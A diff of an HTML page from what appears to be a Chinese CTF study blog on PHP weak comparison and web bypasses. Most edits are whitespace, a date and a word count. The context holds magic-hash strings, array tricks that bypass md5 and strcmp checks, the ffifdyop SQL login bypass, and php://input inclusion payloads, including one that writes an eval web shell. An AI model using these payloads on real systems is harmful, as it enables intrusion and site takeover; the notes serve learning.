@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-09
+                    2021-03-13
                 </div>
                 
 
@@ -414,40 +414,40 @@ $_REQUEST &#x2F;&#x2F; 获取 $_GET，$_POST，$_COOKIE 中的数据<span aria-h
 <h4 id="bool类型比较"><a href="#bool类型比较" class="headerlink" title="bool类型比较"></a>bool类型比较</h4><p>bool类型的true跟任意字符能够弱类型相等</p>
 <h4 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h4><p>1.md5()绕过<code>==</code></p>
 <p> PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		<span class="token comment">//bool(true)</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	    <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">//bool(true)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>上面两个值可以使md5()的开头为0e，经过<code>==</code>弱类型比较可输出‘yes’，但没法经过<code>===</code></p>
 <p>经常使用md5()开头为“0e”的字符：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span>			<span class="token comment">//0e830400451993494058024219903391</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span>			<span class="token comment">//0e462097431906509019562988736854</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e545993274517709034328855841020</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e342768416822451524974117254469</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e848240448830537924465865611904</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e545993274517709034328855841020</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e940624217856561557816327384675</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span>            <span class="token comment">//0e830400451993494058024219903391</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span>            <span class="token comment">//0e462097431906509019562988736854</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e545993274517709034328855841020</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e342768416822451524974117254469</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e848240448830537924465865611904</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e545993274517709034328855841020</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e940624217856561557816327384675</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>2.md5([])绕过<code>===</code></p>
 <p>因为md5()函数不能处理数组，因此在md5()遇到数组时会警告而且返回null，然而能够忽略警告并经过数组绕过<code>===</code>，以下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//bool(true)</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//bool(true)，@表示忽略警告</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(true)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(true)，@表示忽略警告</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><code>ffifdyop</code>，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
 <p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
 <h4 id="sha1-函数"><a href="#sha1-函数" class="headerlink" title="sha1()函数"></a>sha1()函数</h4><p>sha1()与md5()基本原理相同，因此此处仅列出sha1()开头为“0e”的字符串。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span>	<span class="token comment">//0e66507019969427134894567494305185566735</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span>	<span class="token comment">//0e76658526655756207688271159624026011393</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span>	<span class="token comment">//0e89257456677279068558073954252716165668</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span>	<span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span>    <span class="token comment">//0e66507019969427134894567494305185566735</span>
+<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span>    <span class="token comment">//0e76658526655756207688271159624026011393</span>
+<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span>    <span class="token comment">//0e89257456677279068558073954252716165668</span>
+<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span>    <span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="strcmp-、strcasecmp-函数"><a href="#strcmp-、strcasecmp-函数" class="headerlink" title="strcmp()、strcasecmp()函数"></a>strcmp()、strcasecmp()函数</h4><ul>
 <li><p><code>strcmp(string1, string2)</code>、<code>strcasecmp(string1, string2)</code></p>
 <p>比较两个字符串，前者不区分大小写，后者区分大小写。若<code>string1 &gt; string2</code>，返回<code>&gt; 0</code>；若<code>string1 &lt; string2</code>，string返回<code>&lt; 0</code>;若<code>string1 = string2</code>，返回<code>0</code>。然而该函数没法处理数组，当出现数组时，返回<code>null</code>。(下例中@表示忽略警告)</p>
-<pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));				&#x2F;&#x2F;NULL
-var_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D; 0);	&#x2F;&#x2F;bool(true)
-var_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D;&#x3D; 0);	&#x2F;&#x2F;bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));                &#x2F;&#x2F;NULL
+var_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D; 0);    &#x2F;&#x2F;bool(true)
+var_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D;&#x3D; 0);    &#x2F;&#x2F;bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 </li>
 </ul>
@@ -499,8 +499,6 @@ if (!preg_match(&quot;&#x2F;^[a-zA-Z0-9-s_]+.rpt$&#x2F;m&quot;, $file_name)) &#1
 <pre class="line-numbers language-none"><code class="language-none">^ 行首
 $ 行尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-
-
 <p>不开启/m</p>
 <pre class="line-numbers language-none"><code class="language-none">^ 字符串的开始
 $ 字符串的结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -549,7 +547,7 @@ echo $var;<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <p>例子</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?_CONFIG&#x3D;123
 $_CONFIG[&#39;extraSecure&#39;] &#x3D; true;
- 
+
 foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $method) &#123;
     foreach($$method as $key&#x3D;&gt;$value) &#123;
       &#x2F;&#x2F; $key &#x3D;&#x3D; _CONFIG
@@ -558,7 +556,7 @@ foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $method) &#123;
       unset($$key);
     &#125;
 &#125;
- 
+
 if ($_CONFIG[&#39;extraSecure&#39;] &#x3D;&#x3D; false) &#123;
     echo &#39;flag &#123;****&#125;&#39;;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -606,7 +604,7 @@ include($_GET[file]);
 [GET DATA]:   input.php?file&#x3D;php:&#x2F;&#x2F;input
 [POST DATA 1]:&lt;?php phpinfo();?&gt;
 [POST DATA 2]:&lt;?php system(&#39;ls&#39;);?&gt;
-[POST DATA 3]:&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);?&gt;	#我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+[POST DATA 3]:&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);?&gt;    #我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 </li>
 </ul>
@@ -1024,7 +1022,7 @@ include($_GET[file]);
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.4k</span>&nbsp;字
+                class="white-color">42.5k</span>&nbsp;字
             
             
             
